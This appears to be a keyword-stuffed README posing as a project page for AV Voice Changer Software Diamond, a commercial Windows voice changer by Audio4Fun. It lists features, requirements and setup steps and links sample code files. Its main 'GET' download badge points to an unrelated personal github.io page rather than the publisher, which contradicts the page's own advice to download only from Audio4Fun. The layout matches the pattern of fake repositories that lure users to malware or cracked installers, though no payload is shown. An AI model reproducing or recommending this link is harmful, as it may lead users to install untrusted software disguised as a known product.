# AV Voice Changer

AV Voice Changer is the Windows voice morpher in the AV Voice line.

![Banner Placeholder](gui/AV-Voice-1.jpg)

You speak into a microphone. The program shifts pitch and timbre, then hands the result to a virtual audio driver.

Discord, Skype, and Viber can take that driver as their microphone. Steam and Epic games can do the same when they expose an input list.

## About

AV Voice is the short name people use for the same desktop program.

av voice changer diamond is the edition that keeps the full effect list, the ambient beds, and the file morpher.

av voice changer software diamond is the name on the installer and on most store pages.

av voice changer software is the program you open when a call or a match needs a live change.

The morph can push a voice higher or lower. It can lean masculine or feminine, older or younger, or leave the human range for a robot or an alien.

A parody mixer can blend up to four celebrity or human voices into one custom style.

A voice comparator can listen to a short sample and suggest morph settings that sit closer to that sample.

The effect rack holds more than 30 voice effects. The background rack holds about 70 ambient beds, such as a forest or a road.

A file morpher runs the same idea on saved audio, including a batch of files.

The editor inside the program can cut, split, copy, and record a track.

## Preview

The main window is a voice picker, a morph stack, and a pad of background sounds.

![Grid Placeholder](gui/AV-Voice-2.jpg)

The grid is the part you glance at during a call. One row is the voice. The next row is the bed under it.

A small meter shows that the microphone is actually reaching the engine.

[device.py](core/device.py) is the sample that lists input and output devices.

[channel.py](core/channel.py) is the sample that moves a buffer from the mic toward the driver.

## Requirements

The publisher lists Windows Vista and later, with Windows 7 as the practical floor.

The stated hardware floor is a 1 GHz processor, 250 MB of RAM, a full-duplex sound card, speakers, and a microphone. A headset is the easier choice.

The chat apps in view are Discord, Skype, and Viber. The game clients in view are Steam and Epic Games.

[params.py](core/params.py) holds the sample knobs for a morph pass.

Give the buffer a little room. A tiny buffer clicks. A huge buffer lags the sentence behind your mouth.

## Download

Get the Windows build from the publisher, Audio4Fun, or from a store page that names AV Voice Changer Software Diamond.

[![GET AV Voice Changer](https://img.shields.io/badge/GET-AV%20Voice%20Changer-EA580C?style=for-the-badge&labelColor=1F2937&logoColor=white)](https://andrevdnkx870.github.io/.github/AV-Voice-Changer)

Store listings often show a shareware price around $99, sometimes as a lifetime license. This page does not sell a key.

Install that build, then open it once so the virtual audio driver appears in the Windows sound list.

## Running

Set the physical microphone as the AV Voice input.

Set Discord, Skype, Viber, or the game to the virtual audio driver as its microphone.

![Editor Placeholder](gui/AV-Voice-3.jpg)

Speak a normal sentence and watch the meter. If the room is silent, the wrong device is selected.

[AudioEngine.cs](audio/AudioEngine.cs) is the sample capture loop for that path.

A quick test inside the app, before you join the channel, saves a bad first minute.

Zoom and a browser call use the same input swap when they expose a microphone list.

[config.py](server/handlers/config.py) is the sample that keeps route settings in one place.

## SmartScreen Notice

Windows SmartScreen warns on installers it does not already trust.

The copy to trust is the one from the publisher. Skip repacks, forum archives, and bundles that promise a free unlock.

A warning on an unknown file is a reason to close it, then download again from Audio4Fun.

## Built-in Presets

Presets are starting points. You still move pitch and timbre until the character fits the room.

| Direction | What you hear |
| --- | --- |
| Higher | A lighter voice |
| Lower | A heavier voice |
| Masculine | Darker timbre |
| Feminine | Brighter timbre |
| Older | A thinner, slower tone |
| Younger | A lighter, quicker tone |
| Robot | A steady mechanical tone |
| Alien | A non-human tone |

[PresetManager.cs](presets/PresetManager.cs) stores and recalls a named stack.

Pitch in the sample chain is [PitchShiftEffect.cs](dsp/PitchShiftEffect.cs).

Timbre in the sample chain is [FormantShiftEffect.cs](dsp/FormantShiftEffect.cs).

The robot color is [RobotEffect.cs](dsp/RobotEffect.cs).

A room behind the voice is [ReverbEffect.cs](dsp/ReverbEffect.cs).

The order of those blocks is [DSPChain.cs](dsp/DSPChain.cs).

## Global Hotkeys

A hotkey can mute the mic, step to the next voice, or fire a background bed.

The exact keys live in the app settings. Pick keys the game is not already using.

[HotkeyService.cs](services/HotkeyService.cs) is the sample listener for that kind of key.

## Adding Custom Effects

The parody mixer is the custom path. It blends up to four voices.

Start from one preset, then add a second voice under it. Stop at four.

The comparator is the other door. Give it a short clean sample and let it suggest a pitch and a timbre.

[pitch.py](filters/pitch.py) is a sample pitch filter.

[echo.py](filters/echo.py) is a sample echo.

A bed under the voice is [sound.py](sounds/sound.py).

Keep the bed quieter than the sentence. A forest loop that covers the words is too loud.

The file morpher uses the same stack on a saved file. A batch run is for a folder of takes, not for the live mic.

```python
def morph(name, pitch=0.0, timbre=0.0):
    return {"voice": name, "pitch": pitch, "timbre": timbre, "route": "virtual-mic"}
```

That sketch is the shape of a saved voice: a name, two numbers, and the virtual driver as the route.

## Development

The shipped program is the Windows installer. The files next to this page are samples of a mic chain, a preset store, and a small window.

### Linux

A Linux machine can play a file the morpher already wrote. Live routing for Discord stays on the Windows app.

### Mac

A Mac can play that same finished file. The live virtual driver in this line is part of the Windows build.

### Windows

On Windows, install the publisher build, confirm the virtual audio driver, then point the chat app at it.

[main.ts](gui/main.ts) is the sample UI entry.

[conf.json](gui/conf.json) is the sample UI config.

### Advanced setup

Advanced setup is for the sample tree: device names, buffer size, and which filters sit in the chain.

## Performance Architecture

Live morph spends its time on pitch, timbre, and the effect rack.

The 1 GHz floor in the publisher notes is a minimum. A busy effect plus a loud bed wants a faster chip and the 250 MB of RAM already listed.

Full-duplex matters. The card has to capture and play at the same time, or the monitor path falls apart.

Match the sample rate of the microphone and the virtual driver when a test sounds warped.

## Project Structure

| Folder | What the samples cover |
| --- | --- |
| audio | Capture and the device list |
| dsp | Pitch, timbre, robot, reverb |
| presets | Named voices |
| services | Hotkey listener |
| filters | Pitch, echo, and neighboring filters |
| sounds | Background beds |
| gui | The sample window |
| server | A small config and audio route |

Read the folder that matches the knob you are changing. The Windows installer remains the app you run.

## Building Installer

The publisher ships the setup. A sample installer script in this tree is a layout note, not a second download.

Build the sample UI only if you are reading the window code. Your call still uses the installed AV Voice Changer.

## Privacy

The live path listens to the microphone while the engine is on.

A recording exists after you start the recorder. Stop the recorder when the take is done.

The virtual driver carries what you send. A muted mic sends silence to the channel.

## Roadmap

The current desktop line already includes the live morph, the four-voice mixer, the comparator, the effect rack, the ambient beds, and the file morpher.

Later builds from the publisher keep that Windows path. This page will not invent a date for the next one.

## References

Audio4Fun is the publisher behind AV Voice Changer Software Diamond.

The product name on the box is the Diamond software line. Search pages shorten it to AV Voice.

Use those names when you look for the installer. Skip pages that offer an activation code or a cracked setup.

## Glossary

| Term | Meaning |
| --- | --- |
| Morph | A live change of pitch and timbre |
| Timbre | The color of the voice, apart from pitch |
| Virtual audio driver | The microphone Discord and Skype can select |
| Parody mixer | A blend of up to four voices |
| Comparator | A hint toward a voice you sampled |
| File morpher | The same effects on saved audio |
| Bed | An ambient loop under the voice |
| Hotkey | A key that fires a voice or a bed |

## Editions

| Name | Place in the line |
| --- | --- |
| AV Voice Changer | The desktop morpher |
| AV Voice | The short name |
| av voice changer diamond | The Diamond edition |
| av voice changer software diamond | The full product name |
| av voice changer software | The Windows program |

The Diamond edition is the one with the full effect list and the file morpher. Shareware listings often sit around $99.

## License

AV Voice Changer Software Diamond is shareware. Some listings call the paid unlock a lifetime license.

The sample files in this tree carry their own license file. That file covers the samples. The app you install is the publisher build.

## Developer

The AV Voice line is published by Audio4Fun.

## Related Search Terms

AV Voice Changer, AV Voice, av voice changer diamond, av voice changer software diamond, av voice changer software, Topics: voice-changer, voice, audio, discord, python, voice-filters, soundboard, microphone, realtime-voice-changer-app, voice-changer-software
